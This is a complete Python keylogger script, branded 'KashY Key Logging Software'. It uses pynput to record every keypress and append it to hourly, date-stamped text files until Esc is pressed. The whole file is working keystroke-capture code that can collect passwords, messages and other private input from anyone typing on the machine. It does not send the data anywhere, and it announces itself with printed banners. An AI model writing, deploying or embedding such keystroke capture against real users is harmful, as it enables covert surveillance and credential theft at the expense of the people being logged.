import datetime,time
from pynput.keyboard import Listener

def Banner(a):
	print("\n"+"#"*49)
	print("#\tWelcome to KashY "+a+"\t#\n#\t\t\t\t\t\t#")
	print("#\t\tStart Logging ...\t\t#\n#\t\t\t\t\t\t#")
	print("#"*49+"\n\n")
def End_Banner():
	print("\n"+"#"*49+"\n#\t\t\t\t\t\t#")
	print("#\t   Logging Stoped and Saved \t\t#\n#\t\t\t\t\t\t#")
	print("#"*49+"\n\n")

Banner("Key Logging Software")

def creatKeyloggerFile(data):	
	x = datetime.datetime.now()
	filename = "KashY-Keylogger-"+str(x.year)+"-"+str(x.month)+"-"+str(x.day)+"-"+str(x.hour)
	filename = str(filename)+".txt"
	
	with open(filename, 'a') as f:
		f.write(data)
		
def Keystroke_Logger(key):
	key = str(key).replace("'", "")

	if key == 'Key.space':
		key = ' '
	if key == 'Key.shift_r':
		key = ''
	if key == "Key.enter":
		key = '\n'
	if key == "Key.esc":
		End_Banner()
		return False
	creatKeyloggerFile(key)

with Listener(on_press=Keystroke_Logger) as l:
	l.join()
	
